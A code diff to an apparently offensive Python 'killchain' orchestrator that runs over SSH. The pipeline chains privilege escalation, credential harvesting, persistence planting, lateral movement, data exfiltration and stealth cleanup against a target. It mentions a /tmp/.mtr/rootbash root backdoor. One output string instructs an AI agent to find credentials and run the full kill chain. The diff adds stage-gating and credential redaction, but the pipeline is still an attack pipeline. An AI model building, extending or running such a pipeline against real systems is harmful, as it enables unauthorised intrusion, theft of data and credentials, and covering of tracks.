@@ -18,28 +18,30 @@ except ImportError:
     def find_wordlist(cat): return ""
     def find_all_wordlists(cat): return []
 
-from typing import Any, Callable, Optional, TypeVar, Union
+from typing import Any, Callable, Optional, Union
 
 from core.credentials import (
     CredentialRef,
+    call_credential_provider,
     credential_material_for_execution,
     get_all_credential_refs_for_target,
     get_best_credential_ref,
     is_credential_handle,
     resolve_credential_handle,
+    sanitize_credential_text,
 )
 from core.killchain.cleanup import stealth_cleanup
 from core.killchain.exfil import data_exfil
 from core.killchain.exploitation import auto_exploit
 from core.killchain.lateral import lateral_move
 from core.killchain.persistence import plant_persistence
-from core.killchain.privesc import _harvest_credentials, run_privesc
+from core.killchain.policy import master_gate_message, stage_gate_message
+from core.killchain.privesc import run_privesc
 from core.killchain.ssh_helpers import _ssh_connect
 from core.killchain.vuln_assess import vuln_assess
 
 logger = logging.getLogger("octopus.killchain.orchestrator")
 
-_ProviderResult = TypeVar("_ProviderResult")
 _CredentialInput = Union[CredentialRef, str]
 
 # ANSI Colors
@@ -61,6 +63,7 @@ def _resolve_killchain_credential(
     user: Optional[Union[str, CredentialRef]],
     password: Optional[_CredentialInput],
     credential: Optional[_CredentialInput],
+    port: int,
 ) -> tuple[Optional[CredentialRef], str]:
     """Resolve only an opaque SSH credential reference from compatibility inputs."""
 
@@ -93,19 +96,28 @@ def _resolve_killchain_credential(
         return None, "[!] Credential handle scope mismatch."
     if username_hint and resolved.username != username_hint:
         return None, "[!] Credential handle username mismatch."
+    if resolved.port and resolved.port != int(port):
+        return None, "[!] Credential handle port mismatch."
     return resolved, ""
 
 
 def _call_ssh_provider(
-    provider: Callable[..., _ProviderResult],
+    provider: Callable[..., str],
     target: str,
     credential: CredentialRef,
     port: int,
-) -> _ProviderResult:
+) -> str:
     """Reveal a credential only for one immediate provider invocation."""
 
-    with credential_material_for_execution(credential) as material:
-        return provider(target, material.username, material.password, port)
+    return call_credential_provider(
+        credential,
+        lambda material: provider(
+            target,
+            material.username,
+            material.password,
+            port,
+        ),
+    )
 
 
 def _connect_with_credential(
@@ -115,8 +127,38 @@ def _connect_with_credential(
 ) -> tuple[Any, str]:
     """Reveal only while Paramiko establishes an authenticated session."""
 
+    failure = ""
     with credential_material_for_execution(credential) as material:
-        return _ssh_connect(target, material.username, material.password, port)
+        try:
+            client, error = _ssh_connect(
+                target,
+                material.username,
+                material.password,
+                port,
+            )
+        except Exception as exc:
+            failure = (
+                f"{type(exc).__name__}: "
+                f"{sanitize_credential_text(exc, material.password)}"
+            )
+        else:
+            return client, sanitize_credential_text(error or "", material.password)
+    return None, failure or "SSH connection failed"
+
+
+def _call_configured_ssh_stage(
+    stage: str,
+    provider: Callable[..., str],
+    target: str,
+    credential: CredentialRef,
+    port: int,
+) -> str:
+    """Apply the named stage gate immediately before provider execution."""
+
+    denial = stage_gate_message(stage)
+    if denial:
+        return denial
+    return _call_ssh_provider(provider, target, credential, port)
 
 
 def run_full_killchain(
@@ -133,11 +175,16 @@ def run_full_killchain(
     Re-authenticates after privilege escalation before later stages.
     Order: Privesc → Harvest → Persist → Lateral → Exfil → Cleanup (LAST!)
     """
+    master_denial = master_gate_message()
+    if master_denial:
+        return master_denial
+
     selected_credential, credential_error = _resolve_killchain_credential(
         target,
         user,
         password,
         credential,
+        port,
     )
     if credential_error:
         return credential_error
@@ -151,14 +198,17 @@ def run_full_killchain(
     # Stages 3-9 require SSH credentials
     if selected_credential is not None:
         selected_user = selected_credential.username
+        effective_credential = selected_credential
         full_output += (
-            f"[*] Credentials available ({selected_user}@{target}) -- skipping external vuln/exploit stages.\n"
-            f"[*] Proceeding directly to post-exploitation stages 3-9.\n\n"
+            f"[*] Credentials available ({selected_user}@{target}) -- "
+            "running configured post-access stages.\n\n"
         )
-        print(f"  {C_GREEN}[+] Credentials available -- skipping stages 1-2, going to post-exploit{C_RESET}")
+        print(f"  {C_GREEN}[+] Credentials available -- applying named post-access stage policy{C_RESET}")
 
-        # Stage 3: Privilege Escalation
-        privesc_output = _call_ssh_provider(
+        # Privilege escalation owns its credential-harvest pass.  Keeping that
+        # work inside one provider prevents the former duplicate harvest.
+        privesc_output = _call_configured_ssh_stage(
+            "privesc",
             run_privesc,
             target,
             selected_credential,
@@ -167,7 +217,6 @@ def run_full_killchain(
         full_output += privesc_output
 
         # Re-authenticate as root after privilege escalation.
-        effective_credential = selected_credential
         if "ROOT ACCESS CONFIRMED" in privesc_output or "uid=0(root)" in privesc_output:
             re_authed = False
 
@@ -178,6 +227,7 @@ def run_full_killchain(
                     "ssh",
                     username="root",
                     prefer_privileged=True,
+                    port=port,
                 )
                 if root_credential is not None:
                     test_client, _test_err = _connect_with_credential(
@@ -205,39 +255,27 @@ def run_full_killchain(
                 full_output += f"\n[!] Root re-auth failed. Continuing as {selected_user}.\n"
                 full_output += "[!] Note: /tmp/.mtr/rootbash may be available for local root commands.\n"
 
-        # Stage 4: Credential Harvesting (from root = gets shadow, keys, etc.)
-        try:
-            harvest_client, harvest_err = _connect_with_credential(
-                target,
-                effective_credential,
-                port,
-            )
-            if harvest_client:
-                full_output += "\n" + _harvest_credentials(harvest_client, target)
-                harvest_client.close()
-            else:
-                full_output += f"\n[-] Credential harvest SSH failed: {harvest_err}\n"
-        except Exception as e:
-            full_output += f"\n[-] Credential harvest error: {e}\n"
-
-        # Stage 5: Persistence (from root = SSH keys, SUID, crontab)
-        full_output += "\n" + _call_ssh_provider(
+        # Persistence
+        full_output += "\n" + _call_configured_ssh_stage(
+            "persistence",
             plant_persistence,
             target,
             effective_credential,
             port,
         )
 
-        # Stage 6: Lateral Movement
-        full_output += "\n" + _call_ssh_provider(
+        # Lateral movement
+        full_output += "\n" + _call_configured_ssh_stage(
+            "lateral_movement",
             lateral_move,
             target,
             effective_credential,
             port,
         )
 
-        # Stage 7: Data Exfiltration (from root = full access)
-        full_output += "\n" + _call_ssh_provider(
+        # Data exfiltration
+        full_output += "\n" + _call_configured_ssh_stage(
+            "data_exfil",
             data_exfil,
             target,
             effective_credential,
@@ -245,7 +283,8 @@ def run_full_killchain(
         )
 
         # Cleanup must always remain the final stage.
-        full_output += "\n" + _call_ssh_provider(
+        full_output += "\n" + _call_configured_ssh_stage(
+            "cleanup",
             stealth_cleanup,
             target,
             effective_credential,
@@ -253,13 +292,15 @@ def run_full_killchain(
         )
     else:
         # No creds — run full discovery pipeline
-        # Stage 1: Vulnerability Assessment (always runs)
-        full_output += vuln_assess(target, recon_data)
+        vuln_denial = stage_gate_message("vuln_assess")
+        full_output += vuln_denial or vuln_assess(target, recon_data)
 
-        # Stage 2: Automated Exploitation (always runs)
-        full_output += "\n" + auto_exploit(target, recon_data)
+        exploit_denial = stage_gate_message("exploitation")
+        full_output += "\n" + (
+            exploit_denial or auto_exploit(target, recon_data)
+        )
 
-        full_output += "\n[!] No SSH credentials available -- stages 3-9 skipped.\n"
+        full_output += "\n[!] No SSH credentials available -- credential-required stages skipped.\n"
         full_output += (
             "AI: Find credentials first, then run killchain_full with its "
             "credential:// handle.\n"
